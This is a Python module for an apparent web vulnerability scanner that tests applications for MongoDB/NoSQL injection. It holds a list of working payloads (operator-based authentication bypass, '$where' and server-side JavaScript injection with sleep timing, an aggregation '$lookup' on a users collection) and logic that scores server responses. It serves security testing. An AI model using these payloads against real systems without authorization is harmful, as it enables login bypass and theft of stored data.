import re
from injectors.base import BaseInjector
from models.scan_config import VulnerabilityReport


class MongoInjector(BaseInjector):
    """MongoDB / NoSQL injection testing module."""

    name = "mongo"
    description = "Tests for MongoDB NoSQL injection vulnerabilities"

    ERROR_PATTERNS = [
        r"MongoError",
        r"MongoServerError",
        r"MongoDB",
        r"BSON",
        r"SyntaxError.*unexpected token",
        r"Cannot read propert",
        r"\$where",
        r"ReferenceError",
        r"TypeError.*is not a function",
        r"Unterminated string",
        r"invalid operator",
        r"BadValue",
        r"unknown operator",
        r"FieldPath.*doesn.t start with",
        r"unrecognized expression",
    ]

    def generate_quick_payloads(self, context: dict) -> list[str]:
        return [
            '{"$ne": ""}',              # operator injection / auth bypass
            '{"$gt": ""}',              # comparison bypass
            '{"$where": "1==1"}',       # JavaScript injection
        ]

    def generate_payloads(self, context: dict) -> list[str]:
        return [
            # ── Operator injection (query parameter pollution) ──
            '{"$gt": ""}',
            '{"$ne": ""}',
            '{"$gte": ""}',
            '{"$regex": ".*"}',
            '{"$exists": true}',
            '{"$nin": []}',
            '{"$in": [null, "", true, false]}',

            # ── Tautology via $where ──
            '{"$where": "1==1"}',
            '{"$where": "this.a==this.a"}',
            '{"$where": "function(){return true}"}',
            "1; return true",
            "1 || 1==1",

            # ── Authentication bypass patterns ──
            '{"$gt": ""}',                   # password.$gt: "" matches any non-empty
            '{"$ne": null}',
            '{"$regex": "^"}',               # matches everything

            # ── Array/object coercion ──
            "[$ne]=1",
            "[$gt]=",
            "[$exists]=true",
            "[$regex]=.*",

            # ── JavaScript injection via $where ──
            '"; return true; var a="',
            "'; return true; var a='",
            '0; return true',
            "this.constructor.constructor('return this')().sleep(3000)",

            # ── Aggregation pipeline injection ──
            '[{"$match": {"$where": "1==1"}}]',
            '[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "data"}}]',

            # ── MapReduce injection ──
            '{"$func": "function(){return 1}"}',

            # ── Key injection (dot notation traversal) ──
            "admin",
            "__proto__",
            "constructor",
            "prototype",

            # ── URL-encoded operator injection ──
            "%7B%22%24gt%22%3A%22%22%7D",    # {"$gt":""}
            "%7B%22%24ne%22%3A%22%22%7D",    # {"$ne":""}

            # ── SSJI (Server-Side JS Injection) ──
            "';sleep(3000);var a='",
            '";sleep(3000);var a="',
            "1;sleep(3000)",
        ]

    def analyze_response(
        self, baseline: dict, test_response: dict, payload: str,
    ) -> VulnerabilityReport:
        evidence: list[str] = []
        is_vulnerable = False
        confidence = "low"

        body = test_response.get("body", "")
        body_lower = body.lower()
        baseline_body = baseline.get("body", "")
        test_time = test_response.get("response_time_ms", 0)
        baseline_time = baseline.get("response_time_ms", 0)
        test_status = test_response.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)

        # 1. MongoDB error messages leaked
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body_lower, re.IGNORECASE):
                if not re.search(pattern, baseline_body.lower(), re.IGNORECASE):
                    evidence.append(f"MongoDB error pattern: {pattern}")
                    is_vulnerable = True
                    confidence = "high"

        # 2. Time-based (sleep in $where / SSJI)
        if "sleep" in payload.lower():
            if test_time > baseline_time + 2500:
                evidence.append(
                    f"Time-based: {test_time:.0f}ms vs baseline {baseline_time:.0f}ms"
                )
                is_vulnerable = True
                confidence = "high"

        # Helper: a "null-ish" empty response (server just didn't find anything)
        body_stripped = body.strip().strip('"')
        is_empty_response = (
            not body_stripped
            or body_stripped == "null"
            or body_stripped == "{}"
            or body_stripped == "[]"
        )

        # Helper: server properly rejected the input (validation error, not a vuln).
        # Only suppresses ambiguous behavioural checks — NEVER overrides
        # error-pattern or time-based findings already detected above.
        is_rejection = (400 <= test_status < 500)

        # If error/time checks already found something definitive, skip rejection logic
        if is_rejection and not is_vulnerable:
            return VulnerabilityReport(
                is_vulnerable=False,
                confidence="low",
                details="Server rejected input (validation — not a vuln)",
                evidence=evidence,
            )

        # 3. Tautology — operator payload returned data equal to or larger than baseline
        #    A REAL vuln: {"$ne":""} returns the same data as a valid ID, meaning
        #    the operator was evaluated by MongoDB instead of treated as a literal.
        tautology_indicators = ("$gt", "$ne", "$where", "1==1", "return true", "$regex",
                                "$gte", "$exists", "$nin", "$in")
        if any(ind in payload for ind in tautology_indicators):
            if test_status == 200 and not is_empty_response:
                if len(body) >= len(baseline_body) and body != baseline_body:
                    evidence.append("Tautology payload returned data (operator may be evaluated)")
                    is_vulnerable = True
                    confidence = "high"
                elif body == baseline_body:
                    evidence.append("Operator payload returned identical response to baseline")
                    is_vulnerable = True
                    confidence = "medium"

        # 4. Operator accepted — returned MORE data than baseline (not less)
        #    Getting null/empty back just means the lookup failed, NOT injection.
        if payload.startswith("{") and "$" in payload and not is_vulnerable:
            if test_status == 200 and not is_empty_response:
                if len(body) > len(baseline_body) + 20:
                    evidence.append("Operator payload returned more data than baseline")
                    is_vulnerable = True
                    confidence = "medium"

        # 5. Server error triggered
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "medium"

        # 6. Prototype pollution indicators — only flag if server returned
        #    data or changed status in a meaningful way (not just null/empty)
        if payload in ("__proto__", "constructor", "prototype"):
            if test_status == 500 and baseline_status != 500:
                evidence.append("Prototype key caused server error")
                is_vulnerable = True
                confidence = "medium"
            elif test_status == 200 and not is_empty_response and body == baseline_body:
                evidence.append("Prototype key returned same data as valid input")
                is_vulnerable = True
                confidence = "low"

        return VulnerabilityReport(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            details="; ".join(evidence) if evidence else "No indicators found",
            evidence=evidence,
        )
